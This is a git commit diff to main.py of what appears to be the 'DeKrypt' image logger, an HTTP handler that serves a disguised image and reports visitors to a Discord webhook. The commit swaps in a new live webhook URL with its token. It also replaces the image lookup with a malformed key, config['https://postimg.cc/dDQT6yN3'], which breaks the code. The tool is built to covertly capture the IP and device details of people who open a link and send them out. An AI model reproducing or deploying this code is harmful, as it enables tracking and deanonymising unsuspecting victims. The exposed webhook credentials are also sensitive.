ab90d8fa595b5c4ddf88756df0ab609f58799fd4
kin-jpg-arch <changunheo6@gmail.com>
2025-12-24 21:06:41 +0900

    Update main.py

--- main.py
+++ main.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
+    "webhook": "https://discord.com/api/webhooks/1452610908051472534/m029st0btoq4gb6DISuH7ryfOpwJULMlDkS72Skuka3ggokKIEUNNq0kcfMHJXiVnl-3",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -196,9 +196,9 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 if dic.get("url") or dic.get("id"):
                     url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
-                    url = config["image"]
+                    url = config["https://postimg.cc/dDQT6yN3"]
             else:
-                url = config["image"]
+                url = config["https://postimg.cc/dDQT6yN3"]
 
             data = f'''<style>body {{
 margin: 0;
